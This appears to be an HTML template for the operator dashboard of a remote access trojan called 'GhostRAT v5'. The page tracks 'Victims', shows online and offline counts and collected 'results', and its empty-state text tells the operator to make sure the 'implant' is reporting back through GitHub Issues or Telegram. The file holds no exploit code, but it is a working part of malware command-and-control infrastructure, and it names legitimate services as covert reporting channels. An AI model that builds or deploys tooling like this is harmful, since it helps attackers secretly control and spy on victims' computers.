<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostRAT v5 — Dashboard</title>
    <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='img/logo.svg') }}">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <img src="{{ url_for('static', filename='img/logo.svg') }}" alt="GhostRAT" class="logo">
                <span class="version">v5</span>
            </div>
            <nav class="sidebar-nav">
                <a href="{{ url_for('dashboard') }}" class="nav-item active">
                    <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
                    Victims
                </a>
            </nav>
            <div class="sidebar-footer">
                <div class="user-info">
                    <span class="username">{{ session.username }}</span>
                </div>
                <a href="{{ url_for('logout') }}" class="logout-btn">
                    <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
                    Logout
                </a>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <header class="top-bar">
                <h1>Victims</h1>
                <div class="top-bar-actions">
                    <span class="poll-status" id="pollStatus">Polling...</span>
                    <span class="last-poll" id="lastPoll">—</span>
                    <button class="btn btn-sm btn-outline" id="refreshBtn">
                        <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
                        Refresh
                    </button>
                </div>
            </header>

            <div class="content-area">
                <!-- Stats Row -->
                <div class="stats-row" id="statsRow">
                    <div class="stat-card">
                        <div class="stat-value" id="totalVictims">0</div>
                        <div class="stat-label">Total Victims</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value online" id="onlineVictims">0</div>
                        <div class="stat-label">Online</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value offline" id="offlineVictims">0</div>
                        <div class="stat-label">Offline</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="totalResults">0</div>
                        <div class="stat-label">Total Results</div>
                    </div>
                </div>

                <!-- Victim Grid -->
                <div class="victim-grid" id="victimGrid">
                    <!-- Populated by JS -->
                </div>

                <div class="empty-state" id="emptyState" style="display: none;">
                    <svg viewBox="0 0 24 24" width="48" height="48"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    <p>No victims found. Ensure your implant is running and reporting to GitHub Issues or Telegram.</p>
                </div>
            </div>
        </main>
    </div>

    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
</body>
</html>
